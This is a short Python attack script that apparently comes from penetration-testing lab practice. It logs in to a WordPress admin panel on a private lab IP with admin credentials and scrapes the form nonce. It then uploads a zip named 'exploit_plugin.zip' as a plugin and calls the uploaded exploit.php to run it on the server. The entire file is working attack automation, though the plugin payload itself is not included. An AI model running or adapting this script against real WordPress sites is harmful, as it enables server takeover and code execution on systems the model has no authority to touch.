#!/usr/bin/python
# coding: utf-8

import requests
import sys
import bs4

url = 'http://10.11.XX.XX'
loginUri = '/wp/wp-login.php'
adminUri = '/wp/wp-admin/'
pluginUri = '/wp/wp-admin/plugin-install.php?tab=upload'
uploadUri = '/wp/wp-admin/update.php?action=upload-plugin'
uploadFile = {'pluginzip': ('exploit_plugin.zip', open('exploit_plugin.zip', 'rb'), 'application/octet-stream', {'Content-Transfer-Encoding': 'binary'})}
exploitUri = '/wp/wp-content/plugins/exploit_plugin/exploit.php'

# Add Cookie
headers = {'wordpress_test_cookie':'WP+Cookie+check', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'}

try:
    # Session
    s = requests.Session()
    # Login
    loginData =  {'log':'admin', 'pwd':'XXXX', 'redirect_to':url + adminUri, 'wp-submit':'Login', 'rememberme':'forever', 'testcookie':'1'}
    r = s.post(url + loginUri, data=loginData)
    r.raise_for_status()

    # Plugin Install Page
    r = s.get(url + pluginUri, headers=headers)
    r.raise_for_status()
    # Get Hidden Param _wpnonce 
    # <input id="_wpnonce" name="_wpnonce" type="hidden" value="fdccb03ee7"/>
    # <input name="_wp_http_referer" type="hidden" value="/wp/wp-admin/plugin-install.php?tab=upload"/>
    # <input id="pluginzip" name="pluginzip" type="file"/>
    # <input class="button" id="install-plugin-submit" name="install-plugin-submit" type="submit" value="Install Now"/>
    bs4obj = bs4.BeautifulSoup(r.content, 'html5lib')
    wpnonce = bs4obj.find('input',id='_wpnonce')
    # print wpnonce['value']
    # Zip Upload
    multiPartData = {'_wpnonce':wpnonce['value'], 
                 'wp_http_referer':'/wp/wp-admin/plugin-install.php?tab=upload',
                 'install-plugin-submit':'Install Now'}

    r = s.post(url + uploadUri, files=uploadFile, data=multiPartData, headers=headers)
    r.raise_for_status()
    # Exploit Run
    r = s.get(url + exploitUri)
    r.raise_for_status()

except requests.exceptions.RequestException as e:
    print(e)
    sys.exit(1)

print(r.status_code)
# print(r.text)
